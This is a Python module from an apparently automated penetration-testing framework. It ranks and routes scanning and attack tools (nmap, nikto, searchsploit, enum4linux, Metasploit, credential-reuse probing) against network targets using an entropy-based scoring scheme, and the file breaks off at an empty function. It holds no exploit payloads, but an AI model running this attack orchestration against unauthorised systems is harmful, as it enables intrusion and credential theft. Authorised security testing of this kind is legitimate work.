"""
skg :: gravity_field.py

Gravity Field Engine — the operating principle of the substrate.

Gravity is not a scheduler. It is the field dynamics that gives
energy direction. Every sensor, adapter, and tool is an instrument
for introducing energy into the telemetry field. Gravity determines
which instrument to route to which region based on the entropy
gradient — not rules, not priority lists.

Physics:
  - Unknown wickets are high-entropy regions (superposition)
  - Observation collapses unknowns to realized or blocked (measurement)
  - Collapse is reversible — changing the instrument can re-emerge projections
  - Each instrument has observational reach (wavelength) — some regions
    are only visible to certain instruments
  - When an instrument fails to reduce entropy, gravity shifts to
    a different instrument rather than retrying
  - The system follows geodesics through the entropy landscape

Field energy: E = H(π | T) — Shannon entropy of projection given telemetry
  High E = many unknowns = strong gravitational pull
  Low E = mostly realized/blocked = weak pull
  E = 0 = fully determined = no pull

The gravity loop is continuous field dynamics:
  observation → energy change → entropy shift → gravity redirects → next observation

Usage:
  python gravity_field.py --auto --cycles 5
  python gravity_field.py --surface /var/lib/skg/discovery/surface_*.json
"""

import json
import sys
import os
import shlex
import time
import uuid
import math
import glob
import re
import subprocess
import importlib.util
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[1]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from skg.core.paths import SKG_CONFIG_DIR, SKG_HOME, SKG_STATE_DIR, DISCOVERY_DIR, EVENTS_DIR, INTERP_DIR
from skg.identity import parse_workload_ref
from skg.assistant.action_proposals import create_msf_action_proposal
from skg.forge.proposals import create_action, interactive_review
from skg.gravity import (
    GravityFailureReporter,
    applicable_wickets_for_domains,
    apply_first_contact_floor,
    choose_instruments_for_target,
    derive_effective_domains,
    emit_auxiliary_proposals,
    emit_follow_on_proposals,
    execute_triggered_proposals,
    rank_instruments_for_node,
    rank_instruments_for_target,  # compat alias
    summarize_view_nodes,
    summarize_applicable_states,
)
from skg.kernel.engine import KernelStateEngine as _KernelStateEngine
from skg.kernel.pearl_manifold import load_pearl_manifold
from skg.kernel.pearls import Pearl, PearlLedger
from skg.sensors import envelope, precondition_payload
from datetime import datetime, timezone, timedelta
from typing import Any, Optional
from collections import defaultdict
from dataclasses import dataclass, field as dc_field
import logging as _logging
log = _logging.getLogger("skg.gravity")

# Disable HuggingFace Hub network checks for model loading — the model is
# cached locally; reaching out to HF Hub introduces 30-60 s latency or
# fails silently when rate-limited, blocking the entire gravity cycle.
import os as _os
_os.environ.setdefault("TRANSFORMERS_OFFLINE", "1")
_os.environ.setdefault("HF_DATASETS_OFFLINE", "1")
_os.environ.setdefault("HF_HUB_OFFLINE", "1")

# Suppress paramiko transport noise — SSH banner errors during credential probing
# are expected and handled gracefully in the SSH sensor; the paramiko tracebacks
# clutter stdout and mislead operators into thinking something crashed.
_logging.getLogger("paramiko.transport").setLevel(_logging.CRITICAL)


def _gravity_precondition_event(
    *,
    source_id: str,
    toolchain: str,
    wicket_id: str,
    status: str,
    workload_id: str,
    detail: str,
    evidence_rank: int,
    source_kind: str,
    pointer: str,
    confidence: float,
    run_id: str = "",
    attack_path_id: str = "",
    target_ip: str = "",
    domain: str = "",
    version: str = "0",
    ts: str | None = None,
    extra_payload: dict | None = None,
) -> dict:
    payload = precondition_payload(
        wicket_id=wicket_id,
        domain=domain,
        workload_id=workload_id,
        status=status,
        detail=detail,
        attack_path_id=attack_path_id,
        target_ip=target_ip,
    )
    if run_id:
        payload["run_id"] = run_id
    if extra_payload:
        payload.update(dict(extra_payload))
    return envelope(
        event_type="obs.attack.precondition",
        source_id=source_id,
        toolchain=toolchain,
        payload=payload,
        evidence_rank=evidence_rank,
        source_kind=source_kind,
        pointer=pointer,
        confidence=confidence,
        version=version,
        ts=ts,
    )


def _tool_available(tool_name: str) -> bool:
    """Check if a CLI tool is available in PATH."""
    import shutil
    return shutil.which(tool_name) is not None


def _canonical_web_runtime_available() -> bool:
    """Check whether the service-owned web runtime path is available."""
    try:
        from skg_services.gravity.web_runtime import canonical_web_adapter_available
    except Exception:
        return False
    try:
        return bool(canonical_web_adapter_available())
    except Exception:
        return False


def _config_file(name: str) -> Path:
    candidates = [
        SKG_CONFIG_DIR / name,
        SKG_HOME / "config" / name,
    ]
    for candidate in candidates:
        if candidate.exists():
            return candidate
    return candidates[0]


# Instrument paths
def _resolve_web_adapter_dir() -> Path:
    candidate = SKG_HOME / "skg-web-toolchain" / "adapters" / "web_active"
    return candidate


def _resolve_web_projection_dir() -> Path:
    candidate = SKG_HOME / "skg-web-toolchain" / "projections"
    return candidate


WEB_ADAPTER = _resolve_web_adapter_dir()
WEB_PROJECTIONS = _resolve_web_projection_dir()
FEEDS_PATH = SKG_HOME / "feeds"
CVE_DIR = SKG_STATE_DIR / "cve"
PEARLS_FILE = SKG_STATE_DIR / "pearls.jsonl"

# Maximum concurrent instruments per target per cycle.
# Instruments are I/O-bound (network scans, HTTP requests, DB probes)
# so threading provides real parallelism here.
MAX_CONCURRENT = 8
_pearls = PearlLedger(PEARLS_FILE)

# Kernel state engine — replaces last-write-wins observation with
# support vector aggregation per the formal model (Work 3 Section 4).
_kernel = _KernelStateEngine(DISCOVERY_DIR, EVENTS_DIR, CVE_DIR)

# SQLite state mirror — fast queries without scanning NDJSON files
try:
    from skg.core.state_db import GravityStateDB as _GravityStateDB
    _state_db = _GravityStateDB(SKG_STATE_DIR / "state.db")
except Exception:
    _state_db = None

# Wicket knowledge graph — Kuramoto phase dynamics on the semantic space.
# Provides: domain expansion signals, phase gradient gravity boosts,
# entanglement detection, and K-topology cluster order parameters.
try:
    from skg.kernel.wicket_graph import get_wicket_graph as _get_wicket_graph
    _wgraph = _get_wicket_graph()
except Exception as _wg_exc:
    log.debug(f"[wicket_graph] unavailable: {_wg_exc}")
    _wgraph = None

# Register wicket-graph re-registration as a post-install hook so that
# when the forge accepts a toolchain proposal and installs it, the new
# catalog's wicket IDs are immediately visible to the running graph singleton.
# This call is deferred to after the functions are defined (see bottom of
# module-level init block below).
def _register_wgraph_install_hook() -> None:
    try:
        from skg.forge.generator import _post_install_hooks
        if _wgraph_notify_install not in _post_install_hooks:
            _post_install_hooks.append(_wgraph_notify_install)
    except Exception:
        pass

_pearl_manifold = None
try:
    _pearl_manifold = load_pearl_manifold(PEARLS_FILE)
except Exception:
    _pearl_manifold = None


def _pearl_reinforcement_boost(target_ip: str, instrument: "Instrument") -> float:
    if _pearl_manifold is None:
        return 0.0
    try:
        return _pearl_manifold.wavelength_boost(
            hosts=[target_ip],
            wavelength=list(getattr(instrument, "wavelength", []) or []),
        )
    except Exception:
        return 0.0

if WEB_ADAPTER.exists():
    sys.path.insert(0, str(WEB_ADAPTER))


def _load_module_from_file(module_name: str, file_path: Path):
    """Load a module by explicit file path to avoid sys.modules name collisions."""
    spec = importlib.util.spec_from_file_location(module_name, file_path)
    if spec is None or spec.loader is None:
        raise ImportError(f"cannot load module from {file_path}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _latest_surface_path() -> str:
    surfaces = glob.glob(str(DISCOVERY_DIR / "surface_*.json"))
    if not surfaces:
        return ""

    def _score(path: str) -> tuple[int, int, float]:
        try:
            data = json.loads(Path(path).read_text())
            targets = data.get("targets", []) or []
            target_count = sum(1 for t in targets if t.get("ip") or t.get("host"))
            service_count = sum(len(t.get("services", []) or []) for t in targets)
            return (target_count + service_count, target_count, os.path.getmtime(path))
        except Exception:
            return (0, 0, os.path.getmtime(path))

    return max(surfaces, key=_score)


def _has_recent_artifact(pattern: str, max_age_hours: float = 6.0) -> bool:
    matches = glob.glob(pattern)
    if not matches:
        return False
    latest = max(matches, key=os.path.getmtime)
    age_s = max(time.time() - os.path.getmtime(latest), 0.0)
    return age_s <= (max_age_hours * 3600.0)


def _parse_nmap_services(xml_file: Path) -> list[tuple[int, str, str]]:
    import xml.etree.ElementTree as ET

    services: list[tuple[int, str, str]] = []
    try:
        root = ET.parse(xml_file).getroot()
    except Exception:
        return services
    host_el = root.find("host")
    if host_el is None:
        return services
    for port_el in host_el.findall(".//port"):
        state_el = port_el.find("state")
        if state_el is None or state_el.get("state") != "open":
            continue
        svc_el = port_el.find("service")
        port = int(port_el.get("portid", "0") or 0)
        svc_name = svc_el.get("name", "") if svc_el is not None else ""
        product = svc_el.get("product", "") if svc_el is not None else ""
        version = svc_el.get("version", "") if svc_el is not None else ""
        extra = svc_el.get("extrainfo", "") if svc_el is not None else ""
        banner = " ".join(x for x in (product, version, extra) if x).strip()
        services.append((port, svc_name, banner))
    return services


def _classify_target_from_services(ip: str, services: list[tuple[int, str, str]], current_target: dict | None = None) -> dict:
    discovery = _load_module_from_file("skg_discovery_runtime", SKG_HOME / "skg-discovery" / "discovery.py")
    current_target = current_target or {}
    classified = discovery.classify_target(
        ip,
        services,
        os_guess=current_target.get("os", "unknown"),
        is_container=ip.startswith(("172.17.", "172.18.")),
    )
    classified["wicket_states"] = current_target.get("wicket_states", {})
    return classified


def _update_surface_target_record(surface_path: str, ip: str, services: list[tuple[int, str, str]] | None = None) -> None:
    if not surface_path:
        return
    p = Path(surface_path)
    if not p.exists():
        return
    try:
        surface = json.loads(p.read_text())
    except Exception:
        return
    targets = surface.get("targets", [])
    for idx, target in enumerate(targets):
        if target.get("ip") != ip:
            continue
        service_tuples = services
        if service_tuples is None:
            service_tuples = [
                (int(s.get("port", 0)), s.get("service", ""), s.get("banner", ""))
                for s in target.get("services", [])
            ]
        refreshed = _classify_target_from_services(ip, service_tuples, current_target=target)
        refreshed["wicket_states"] = load_wicket_states(ip)
        targets[idx] = refreshed
        surface["targets"] = targets
        surface.setdefault("meta", {})["targets_classified"] = len(targets)
        p.write_text(json.dumps(surface, indent=2))
        return


def _infer_target_identity_properties(target: dict) -> dict:
    services = target.get("services", []) or []
    domains = set(target.get("domains", []) or [])
    ports = {svc.get("port") for svc in services}
    names = {(svc.get("service") or svc.get("name") or "").lower() for svc in services}
    externally_observable_only = bool(services) and not any(
        p in {22, 139, 445, 3306, 5432} for p in ports
    )
    auth_surface_present = any(
        ("auth" in n) or (p in {22, 443})
        for n, p in (
            ((svc.get("service") or svc.get("name") or "").lower(), svc.get("port"))
            for svc in services
        )
    )
    interactive_surface_present = any(p in {80, 443, 8080, 8443, 8008, 8009} for p in ports)
    return {
        "externally_observable_only": externally_observable_only,
        "network_reachable_only": target.get("kind") == "external-web",
        "host_semantics_unconfirmed": 22 not in ports and "host" not in domains,
        "container_semantics_present": "container_escape" in domains,
        "data_semantics_present": "data_pipeline" in domains or any(
            p in {3306, 5432, 6379, 27017} for p in ports
        ),
        "interactive_surface_present": interactive_surface_present,
        "auth_surface_present": auth_surface_present,
        "service_names": sorted(n for n in names if n),
    }


def _instrument_observation_coherence(inst_name: str, target: dict) -> float:
    target_row = target if isinstance(target.get("target"), dict) else {}
    if target_row:
        view_state = dict(target_row.get("view_state") or {})
        target = dict(target_row.get("target") or {})
    else:
        view_state = dict(target.get("view_state") or {})
    identity = _infer_target_identity_properties(target)
    domains = set(target.get("domains", []) or [])
    domains.update(str(domain) for domain in (view_state.get("measured_domains") or []) if str(domain or "").strip())
    tool_overlay = dict(view_state.get("observed_tools") or {})
    tool_instrument_hints = {
        {
            "credential_reuse": "cred_reuse",
        }.get(str(item or "").strip(), str(item or "").strip())
        for item in (tool_overlay.get("instrument_hints") or [])
        if str(item or "").strip()
    }
    tool_domain_hints = {
        {
            "binary": "binary_analysis",
            "data": "data_pipeline",
        }.get(str(item or "").strip(), str(item or "").strip())
        for item in (tool_overlay.get("domain_hints") or [])
        if str(item or "").strip()
    }
    tool_names = {
        str(item or "").strip().lower()
        for item in (tool_overlay.get("tool_names") or [])
        if str(item or "").strip()
    }
    ports = {svc.get("port") for svc in target.get("services", []) or []}
    names = set(identity.get("service_names", []) or [])

    host_present = ("host" in domains) or (not identity.get("host_semantics_unconfirmed")) or (22 in ports)
    data_present = ("data_pipeline" in domains) or bool(identity.get("data_semantics_present"))
    container_present = ("container_escape" in domains) or bool(identity.get("container_semantics_present"))
    interactive_present = bool(identity.get("interactive_surface_present"))
    auth_present = bool(identity.get("auth_surface_present"))
    ai_present = ("ai_target" in domains) or any(p in {11434, 6333, 7860, 8888, 5001, 4000, 6006, 8001, 9000} for p in ports)
    iot_present = ("iot_firmware" in domains) or any(n in {"telnet", "upnp", "rtsp", "mqtt", "modbus"} for n in names)

    if inst_name == "nmap":
        return 1.0
    if inst_name == "pcap":
        return 1.0 if ports or interactive_present else 0.5
    if inst_name == "nvd_feed":
        return 1.0 if ports else 0.0
    if inst_name in {"http_collector", "auth_scanner"}:
        if interactive_present or "web" in domains:
            return 1.0 if (inst_name != "auth_scanner" or auth_present) else 0.7
        return 0.0
    if inst_name in {"ssh_sensor", "sysaudit"}:
        return 1.0 if host_present else 0.0
    if inst_name == "data_profiler":
        return 1.0 if data_present else 0.0
    if inst_name == "container_inspect":
        return 1.0 if container_present else 0.0
    if inst_name == "supply_chain":
        return 1.0 if (host_present or container_present or data_present) else 0.0
    if inst_name == "ai_probe":
        if ai_present:
            return 1.0
        if interactive_present or identity.get("network_reachable_only"):
            return 0.35
        return 0.0
    if inst_name == "binary_analysis":
        if "binary_analysis" in domains:
            return 1.0
        if inst_name in tool_instrument_hints or "binary_analysis" in tool_domain_hints or tool_names & {"checksec", "rabin2", "r2", "ropgadget", "ltrace"}:
            return 0.85
        return 0.0
    if inst_name == "iot_firmware":
        return 1.0 if iot_present else 0.0
    if inst_name == "metasploit":
        if interactive_present or host_present or data_present or container_present or ai_present or iot_present:
            return 1.0
        return 0.0
    if inst_name == "nikto":
        if interactive_present or "web" in domains:
            return 1.0
        if inst_name in tool_instrument_hints or "web" in tool_domain_hints or "nikto" in tool_names:
            return 0.7
        return 0.0
    if inst_name == "searchsploit":
        if ports:
            return 1.0
        if inst_name in tool_instrument_hints:
            return 0.65
        return 0.0
    if inst_name == "enum4linux":
        if host_present or "ad_lateral" in domains:
            return 1.0
        if inst_name in tool_instrument_hints or "ad_lateral" in tool_domain_hints or tool_names & {"enum4linux", "enum4linux-ng", "rpcclient"}:
            return 0.7
        return 0.0
    if inst_name == "cred_reuse":
        if auth_present or host_present or data_present:
            return 1.0
        if inst_name in tool_instrument_hints or "hydra" in tool_names:
            return 0.6
        return 0.0
    if inst_name in {"process_probe", "boot_probe"}:
        # High coherence once SSH is available (HO-03 realized) or host domain present
        return 1.0 if host_present else 0.3
    if inst_name == "gpu_probe":
        # Always run network phase; SSH phase conditional on host access
        # High coherence for AI/ML targets (likely have GPUs), moderate for all others
        if ai_present:
            return 1.0
        if host_present:
            return 0.7
        # Network scan for exposed compute APIs is always worth running
        return 0.4
    if inst_name == "cognitive_probe":
        # Only meaningful when target is an AI/LLM endpoint
        if ai_present:
            return 1.0
        return 0.1
    return 1.0


def _observed_tool_summary(view_state: dict | None) -> str:
    tool_overlay = dict((view_state or {}).get("observed_tools") or {})
    tool_names = [
        str(item or "").strip()
        for item in (tool_overlay.get("tool_names") or [])
        if str(item or "").strip()
    ]
    instrument_hints = [
        str(item or "").strip()
        for item in (tool_overlay.get("instrument_hints") or [])
        if str(item or "").strip()
    ]
    if not tool_names and not instrument_hints:
        return "none"

    parts = []
    if tool_names:
        rendered_tools = []
        for tool_name in tool_names[:8]:
            if tool_name == "nmap" and (
                bool(tool_overlay.get("nse_available"))
                or any(
                    isinstance(item, dict)
                    and str(item.get("name") or "").strip().lower() == "nmap"
                    and bool(item.get("nse_available"))
                    for item in (tool_overlay.get("observed_tools") or [])
                )
            ):
                count = int(tool_overlay.get("nse_script_count", 0) or 0)
                rendered_tools.append(f"{tool_name} (NSE={count})" if count > 0 else f"{tool_name} (NSE)")
            else:
                rendered_tools.append(tool_name)
        parts.append(", ".join(rendered_tools))
    if instrument_hints:
        parts.append(f"hints: {', '.join(instrument_hints[:8])}")
    return "; ".join(parts)


def _merge_configured_targets(surface: dict) -> dict:
    """
    Inject any targets declared in /etc/skg/targets.yaml that are not already
    present in the surface.  Auto-discovery misses KVM/libvirt subnets and any
    host that happened to be down at scan time.
    """
    targets_file = _config_file("targets.yaml")
    if not targets_file.exists():
        return surface
    try:
        import yaml as _yaml
        data = _yaml.safe_load(targets_file.read_text()) or {}
        # Support both list-root and dict-root targets.yaml shapes
        if isinstance(data, list):
            data = {"targets": data}
    except Exception:
        return surface
    existing_ips: set[str] = {t.get("ip", "") for t in surface.get("targets", [])}
    new_targets = []
    for entry in (data.get("targets") or []):
        ip = str(entry.get("host") or entry.get("ip") or "").strip()
        # Strip URL scheme — targets.yaml host fields must be hostname/IP only
        if "://" in ip:
            try:
                from urllib.parse import urlparse as _up
                ip = _up(ip).hostname or ip
            except Exception:
                pass
        if not ip or ip in existing_ips:
            continue
        # Build a minimal service list from the declared services block
        svc_map: dict = entry.get("services") or {}
        services: list[tuple[int, str, str]] = []
        port_hints = {
            "http": (entry.get("services", {}).get("http", {}).get("port") or 80, "http"),
            "ftp":  (entry.get("services", {}).get("ftp", {}).get("port") or 21, "ftp"),
            "ssh":  (entry.get("services", {}).get("ssh", {}).get("port") or 22, "ssh"),
            "mysql": (entry.get("services", {}).get("mysql", {}).get("port") or 3306, "mysql"),
        }
        if not svc_map:
            method = entry.get("method", "")
            if method in ("http", "https"):
                services.append((80, "http", ""))
            elif method == "ssh":
                services.append((22, "ssh", ""))
            else:
                services.append((80, "http", ""))
        else:
            for svc_name, svc_conf in svc_map.items():
                if not isinstance(svc_conf, dict):
                    continue
                port = int(svc_conf.get("port") or port_hints.get(svc_name, (0, ""))[0] or 0)
                if port:
                    services.append((port, svc_name, ""))
        tags = entry.get("tags") or []
        os_guess = "windows" if "windows" in tags else "linux"
        try:
            classified = _classify_target_from_services(ip, services)
        except Exception:
            classified = {
                "ip": ip,
                "os": os_guess,
                "services": [{"port": p, "service": s, "banner": b} for p, s, b in services],
                "domains": [],
                "attack_paths": [],
                "wicket_states": {},
            }
        classified["ip"] = ip
        classified["workload_id"] = entry.get("workload_id", "")
        classified["os"] = os_guess if classified.get("os") in ("unknown", "", None) else classified["os"]
        classified["wicket_states"] = load_wicket_states(ip)
        new_targets.append(classified)
        existing_ips.add(ip)
    if new_targets:
        surface = dict(surface)
        surface["targets"] = list(surface.get("targets", [])) + new_targets
    return surface


def _hydrate_surface_from_latest_nmap(surface_path: str) -> dict:
    if not surface_path:
        return {}
    p = Path(surface_path)
    if not p.exists():
        return {}
    try:
        surface = json.loads(p.read_text())
    except Exception:
        return {}
    changed = False
    for idx, target in enumerate(surface.get("targets", [])):
        ip = target.get("ip", "")
        matches = sorted(glob.glob(str(DISCOVERY_DIR / f"nmap_{ip}_*.xml")), key=os.path.getmtime)
        if not matches:
            target["wicket_states"] = load_wicket_states(ip)
            continue
        services = _parse_nmap_services(Path(matches[-1]))
        if services:
            refreshed = _classify_target_from_services(ip, services, current_target=target)
            refreshed["wicket_states"] = load_wicket_states(ip)
            if (
                refreshed.get("services") != target.get("services")
                or refreshed.get("domains") != target.get("domains")
                or refreshed.get("wicket_states") != target.get("wicket_states")
                or refreshed.get("os") != target.get("os")
                or refreshed.get("kind") != target.get("kind")
            ):
                surface["targets"][idx] = refreshed
                changed = True
        else:
            target["wicket_states"] = load_wicket_states(ip)
    if changed:
        surface.setdefault("meta", {})["targets_classified"] = len(surface.get("targets", []))
        p.write_text(json.dumps(surface, indent=2))
    return surface


def _load_fresh_view_state(identity_key: str | None = None) -> dict:
    try:
        from skg.intel.surface import surface as build_surface

        measured_surface = build_surface(
            interp_dir=INTERP_DIR,
            pearls_path=PEARLS_FILE,
        )
        view_nodes = list(measured_surface.get("view_nodes") or [])
    except Exception:
        return {}

    if identity_key:
        return summarize_view_nodes(view_nodes, identity_key=identity_key)

    identities = {
        str(row.get("identity_key") or "").strip()
        for row in view_nodes
        if str(row.get("identity_key") or "").strip()
    }
    return {
        key: summarize_view_nodes(view_nodes, identity_key=key)
        for key in identities
    }


def _synthetic_target_from_view(identity_key: str, view_state: dict | None = None) -> dict:
    view_state = dict(view_state or {})
    return {
        "ip": identity_key,
        "host": identity_key,
        "hostname": identity_key,
        "os": "unknown",
        "kind": "view_node",
        "services": [],
        "domains": list(view_state.get("measured_domains") or []),
        "attack_paths": [],
        "wicket_states": {},
        "_synthetic_from_view": True,
    }


def _gravity_subject_rows(surface: dict, view_state_by_identity: dict, focus_target: str | None = None) -> list[dict]:
    def _subject_aliases(*values: str) -> set[str]:
        aliases: set[str] = set()
        for value in values:
            text = str(value or "").strip()
            if not text:
                continue
            aliases.add(text)
            parsed = parse_workload_ref(text)
            for candidate in (
                parsed.get("identity_key"),
                parsed.get("host"),
                parsed.get("locator"),
                parsed.get("manifestation_key"),
            ):
                candidate_text = str(candidate or "").strip()
                if candidate_text:
                    aliases.add(candidate_text)
        return aliases

    target_by_identity: dict[str, dict] = {}
    for target in surface.get("targets", []) or []:
        identity_key = str(target.get("ip") or target.get("host") or "").strip()
        if identity_key:
            target_by_identity[identity_key] = dict(target)

    identities = set(target_by_identity.keys()) | {
        str(identity_key or "").strip()
        for identity_key in (view_state_by_identity or {}).keys()
        if str(identity_key or "").strip()
    }
    if focus_target:
        filtered: set[str] = set()
        for identity_key in identities:
            target = dict(target_by_identity.get(identity_key) or {})
            aliases = _subject_aliases(
                identity_key,
                target.get("ip"),
                target.get("host"),
                target.get("hostname"),
                target.get("workload_id"),
            )
            if focus_target in aliases:
                filtered.add(identity_key)
        identities = filtered

    rows: list[dict] = []
    for identity_key in sorted(identities):
        view_state = dict((view_state_by_identity or {}).get(identity_key) or summarize_view_nodes([], identity_key=identity_key))
        target = dict(target_by_identity.get(identity_key) or _synthetic_target_from_view(identity_key, view_state))
        ip = str(target.get("ip") or identity_key).strip()
        target["ip"] = ip
        rows.append({
            "identity_key": identity_key,
            "ip": ip,
            "target": target,
            "view_state": view_state,
        })
    return rows


def _fold_identity_key(fold) -> str:
    why = dict(getattr(fold, "why", {}) or {})
    candidates = [
        why.get("identity_key"),
        why.get("workload_id"),
        why.get("host"),
        why.get("target_ip"),
        getattr(fold, "location", ""),
    ]
    for candidate in candidates:
        text = str(candidate or "").strip()
        if not text:
            continue
        identity_key = str(parse_workload_ref(text).get("identity_key") or "").strip()
        if identity_key:
            return identity_key
    return ""


def _fold_state_filename(identity_key: str) -> str:
    # Normalise dots → underscores so 127.0.0.1 and 127_0_0_1 always map to the same file.
    token = re.sub(r"[^A-Za-z0-9_-]+", "_", str(identity_key or "").strip()).strip("_") or "unknown"
    return f"folds_{token}.json"


def _load_persisted_fold_managers(folds_dir: Path) -> dict[str, object]:
    managers: dict[str, object] = {}
    try:
        from skg.kernel.folds import FoldManager
    except Exception:
        return managers
    if not folds_dir.exists():
        return managers
    # Track which canonical filenames we've already loaded to deduplicate
    # the old dot-notation and new underscore-notation files for the same IP.
    # Expire fold files older than 14 days — stale hosts don't benefit from
    # accumulating un-resolvable folds across many cycles.
    _fold_ttl = datetime.now(timezone.utc) - timedelta(days=14)
    seen_stems: set[str] = set()
    for fold_file in sorted(folds_dir.glob("folds_*.json"), key=lambda f: f.stat().st_mtime):
        try:
            _fmtime = datetime.fromtimestamp(fold_file.stat().st_mtime, tz=timezone.utc)
            if _fmtime < _fold_ttl:
                fold_file.unlink(missing_ok=True)
                continue
            # Normalise stem to canonical form (underscores only) for dedup
            raw_stem = fold_file.stem.replace("folds_", "")
            canonical_stem = re.sub(r"[^A-Za-z0-9_-]+", "_", raw_stem).strip("_")
            if canonical_stem in seen_stems:
                # Prefer newer file — already loaded; remove this stale duplicate
                fold_file.unlink(missing_ok=True)
                continue
            seen_stems.add(canonical_stem)
            fm = FoldManager.load(fold_file)
            all_folds = fm.all()
            if not all_folds:
                continue
            # Filter out stale CVE-derived temporal folds that are no longer
            # being regenerated (since detect_temporal now skips CVE wickets).
            all_folds = [
                f for f in all_folds
                if not (f.fold_type == "temporal" and
                        "CVE-" in (f.constraint_source or ""))
            ]
            if not all_folds:
                fold_file.unlink(missing_ok=True)
                continue
            identity_key = (
                _fold_identity_key(all_folds[0])
                or raw_stem.replace("_", ".")   # legacy dot-notation recovery
            )
            if identity_key not in managers:
                managers[identity_key] = FoldManager()
            for fold in all_folds:
                managers[identity_key].add(fold)
        except Exception:
            continue
    return managers


def iso_now() -> str:
    return datetime.now(timezone.utc).isoformat()


# ── Instruments ──────────────────────────────────────────────────────────
# Each instrument has:
#   - name: identifier
#   - wavelength: what regions of state space it can observe
#   - cost: time/resource cost per observation
#   - reach: what wickets it can potentially resolve
#   - available: whether the instrument exists on this system

@dataclass
class Instrument:
    name: str
    description: str
    wavelength: list  # What kinds of unknowns it can resolve
    cost: float       # Relative cost (1.0 = baseline HTTP request)
    available: bool = False
    last_used_on: dict = dc_field(default_factory=dict)  # node_key → timestamp
    entropy_history: dict = dc_field(default_factory=dict)  # node_key → [entropy_before, entropy_after]

    def failed_to_reduce(self, node_key: str) -> bool:
        """Did this instrument fail to reduce entropy on this node?"""
        history = self.entropy_history.get(node_key, [])
        if not history:
            return False
        # 999 = hard error sentinel (config missing, binary not found, etc.)
        if history[-1] >= 500:
            return True
        if len(history) >= 3:
            return history[-1] >= history[-2] >= history[-3]
        return False



def _load_nvd_key() -> str:
    """Load NVD API key from environment or /etc/skg/skg.env."""
    key = os.environ.get("NIST_NVD_API_KEY", "")
    if not key:
        skg_env = _config_file("skg.env")
        if skg_env.exists():
            for line in skg_env.read_text().splitlines():
                line = line.strip()
                if line.startswith("NIST_NVD_API_KEY="):
                    key = line.split("=", 1)[1].strip().strip('"').strip("'")
                    if key:
                        os.environ["NIST_NVD_API_KEY"] = key
                    break
    return key


def _infer_domain_from_fold(fold) -> str:
    source = (getattr(fold, "constraint_source", "") or "").lower()
    detail = (getattr(fold, "detail", "") or "").lower()
    text = f"{source} {detail}"
    if any(x in text for x in ("apache", "nginx", "http", "https", "php", "tomcat", "ajp", "web")):
        return "web"
    if any(x in text for x in ("mysql", "postgres", "postgresql", "mssql", "redis", "mongodb", "oracle")):
        return "data_pipeline"
    if any(x in text for x in ("docker", "container", "kubernetes", "podman")):
        return "container_escape"
    if any(x in text for x in ("ssh", "sudo", "suid", "kernel", "host")):
        return "host"
    if any(x in text for x in ("mqtt", "coap", "samsung", "chromecast", "iot")):
        return "iot_firmware"
    return "web"


def _compiler_hints_from_fold(fold) -> dict:
    source = getattr(fold, "constraint_source", "") or ""
    detail = getattr(fold, "detail", "") or ""
    why = getattr(fold, "why", {}) or {}
    hints = {"packages": [], "keywords": []}
    if source.startswith("nvd_feed::"):
        cve_id = source.split("::", 1)[1]
        hints["keywords"].append(cve_id)
    attack_path_id = str(why.get("attack_path_id", "") or "")
    if attack_path_id:
        hints["keywords"].append(attack_path_id)
        for token in attack_path_id.replace("-", "_").split("_"):
            if len(token) >= 4:
                hints["keywords"].append(token.lower())
    service = str(why.get("service", "") or "")
    if service:
        detail = f"{detail} {service}".strip()
    for token in re.findall(r"\b(?:apache|php|nginx|tomcat|mysql|postgres(?:ql)?|redis|mongodb|docker|kubernetes)\b", detail, re.I):
        lowered = token.lower()
        hints["keywords"].append(lowered)
        hints["packages"].append(lowered)
    hints["keywords"] = sorted(set(hints["keywords"]))
    hints["packages"] = sorted(set(hints["packages"]))
    return hints


def _catalog_growth_command_for_fold(domain: str, fold, hints: dict) -> tuple[str, str]:
    detail = (getattr(fold, "detail", "") or "").strip()
    why = getattr(fold, "why", {}) or {}
    description = detail[:160] or f"{domain} fold suggests missing catalog coverage"
    if getattr(fold, "fold_type", "") == "projection":
        path_id = str(why.get("attack_path_id", "") or "")
        service = str(why.get("service", "") or domain)
        description = f"Catalog attack path coverage for {service} including {path_id or 'observed exploit chain'}"[:160]

    cmd = [
        "skg", "catalog", "compile",
        "--domain", domain,
        "--description", description,
        "--dry-run",
    ]
    packages = ",".join(sorted(set(hints.get("packages", []))))
    keywords = ",".join(sorted(set(hints.get("keywords", []))))
    if packages:
        cmd.extend(["--packages", packages])
    if keywords:
        cmd.extend(["--keywords", keywords])
    return " ".join(shlex.quote(part) for part in cmd), description


def _catalog_growth_command_for_cluster(domain: str, family: str, folds: list, hints: dict) -> tuple[str, str]:
    top_fold = folds[0]
    detail = (getattr(top_fold, "detail", "") or "").strip()
    if len(folds) > 1:
        description = f"Catalog missing {domain} coverage for {family} across {len(folds)} related folds"[:160]
    else:
        description = detail[:160] or f"{domain} fold suggests missing catalog coverage"

    cmd = [
        "skg", "catalog", "compile",
        "--domain", domain,
        "--description", description,
        "--dry-run",
    ]
    packages = ",".join(sorted(set(hints.get("packages", []))))
    keywords = ",".join(sorted(set(hints.get("keywords", []))))
    if packages:
        cmd.extend(["--packages", packages])
    if keywords:
        cmd.extend(["--keywords", keywords])
    return " ".join(shlex.quote(part) for part in cmd), description


def _fold_service_family(fold) -> str:
    source = getattr(fold, "constraint_source", "") or ""
    detail = getattr(fold, "detail", "") or ""

    service_match = re.search(r"Service:\s*([A-Za-z0-9_.+-]+)", detail)
    if service_match:
        return service_match.group(1).split("/", 1)[0].lower()

    text = f"{source} {detail}".lower()
    for token in (
        "php", "apache", "nginx", "tomcat", "mysql", "postgresql", "postgres",
        "redis", "mongodb", "docker", "kubernetes", "ssh", "sudo", "suid",
    ):
        if token in text:
            return token
    return "generic"


_RESONANCE_ENGINE = None  # lazy-loaded, shared across calls within a gravity process


def _get_resonance_engine():
    """Load the resonance engine from disk (lazy, cached for the process lifetime)."""
    global _RESONANCE_ENGINE
    if _RESONANCE_ENGINE is not None:
        return _RESONANCE_ENGINE
    try:
        from skg.resonance.engine import ResonanceEngine
        engine = ResonanceEngine(SKG_STATE_DIR / "resonance")
        engine.boot()
        _RESONANCE_ENGINE = engine
    except Exception as exc:
        print(f"  [RESONANCE] engine unavailable: {exc}")
    return _RESONANCE_ENGINE


def _get_anthropic_api_key() -> str:
